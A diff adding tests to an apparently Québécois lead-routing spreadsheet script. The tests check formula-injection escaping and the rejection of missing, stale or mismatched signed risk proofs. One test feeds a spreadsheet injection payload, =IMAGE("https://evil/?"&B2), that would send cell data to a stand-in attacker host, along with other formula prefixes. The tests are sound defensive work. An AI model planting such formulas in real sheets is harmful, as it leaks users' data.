@@ -146,6 +146,38 @@ console.log(hb.body.split('\n').slice(0, 8).join('\n'));
 check('Colonnes anti-faux leads présentes dans Diagnostic', ['lead_id', 'otp_statut', 'risque_score', 'preuve_valide'].every((k) => sheets.Diagnostic.data[0].includes(k)));
 check('Une ligne par lead dans Diagnostic (mise à jour par lead_id)', new Set(rows('Diagnostic').map((r) => r.lead_id)).size === rows('Diagnostic').length);
 
+// 12. Revue sécurité 2026-11-24 : aucune valeur du client ne peut devenir une formule dans « Leads »
+const okProof = (id, tel, courriel) => sign({ v: 1, id, t: Date.now(), tel, courriel, score: 0, action: 'CLEAN' });
+ctx.routeLead_(base({ lead_id: 'L20', courriel: 'eve.cote@hotmail.ca', telephone: '819 821-2121', enjeu_principal: '=IMAGE("https://evil/?"&B2)',
+  operateur: '+SUM(1)', type_ligne: ' =1+1', ip: '@x', preuve_risque: okProof('L20', '+18198212121', 'eve.cote@hotmail.ca') }));
+const inj = rows('Leads').find((r) => r['Lead ID'] === 'L20') || {};
+check('Injection de formule neutralisée (Besoin, Opérateur, Type de ligne, IP)',
+  ['Besoin', 'Opérateur', 'Type de ligne', 'IP'].every((k) => String(inj[k]).startsWith("'")), ['Besoin', 'Opérateur', 'Type de ligne', 'IP'].map((k) => inj[k]).join(' | '));
+
+// 13. Preuve serveur absente (secret configuré) → « À vérifier », aucun rappel automatique
+const ev0 = events.length;
+const noProof = base({ lead_id: 'L21', courriel: 'li.wang@outlook.com', telephone: '613 555-7788' });
+delete noProof.risque_score; delete noProof.risque_action;
+ctx.routeLead_(noProof);
+const np = rows('Leads').find((r) => r['Lead ID'] === 'L21') || {};
+check('Sans preuve serveur → À vérifier, pas de rappel', np.Statut === 'À vérifier' && events.length === ev0 && /sans_preuve_serveur/.test(np.Raisons), np.Statut + ' · ' + np.Raisons);
+
+// 14. Preuve périmée (> 6 h) → traitée comme absente
+ctx.routeLead_(base({ lead_id: 'L22', courriel: 'jf.obrien@gmail.com', telephone: '581 300-4412',
+  preuve_risque: sign({ v: 1, id: 'L22', t: Date.now() - 7 * 3600 * 1000, tel: '+15813004412', courriel: 'jf.obrien@gmail.com', score: 0, action: 'CLEAN' }) }));
+const st = rows('Leads').find((r) => r['Lead ID'] === 'L22') || {};
+check('Preuve périmée → À vérifier, pas de rappel', st.Statut === 'À vérifier' && events.length === ev0, st.Statut);
+
+// 15. Preuve d'un autre courriel → traitée comme absente
+ctx.routeLead_(base({ lead_id: 'L23', courriel: 'ana.roy@videotron.ca', telephone: '819 555-4433', preuve_risque: okProof('L23', '+18195554433', 'autre@gmail.com') }));
+const mm = rows('Leads').find((r) => r['Lead ID'] === 'L23') || {};
+check('Preuve d\'un autre courriel → À vérifier, pas de rappel', mm.Statut === 'À vérifier' && events.length === ev0, mm.Statut);
+
+// 16. Témoin : preuve valide et concordante → Nouveau + rappel
+ctx.routeLead_(base({ lead_id: 'L24', courriel: 'luc.gagnon@bell.net', telephone: '418 555-6677', preuve_risque: okProof('L24', '+14185556677', 'luc.gagnon@bell.net') }));
+const good = rows('Leads').find((r) => r['Lead ID'] === 'L24') || {};
+check('Preuve valide → Nouveau + rappel créé', good.Statut === 'Nouveau' && events.length === ev0 + 1, good.Statut + ' · rappels ' + (events.length - ev0));
+
 console.log('\n' + mails[0]?.body.split('\n').slice(0, 8).join('\n'));
 console.log(fails ? '\n' + fails + ' échec(s)' : '\nTout passe.');
 process.exit(fails ? 1 : 0);
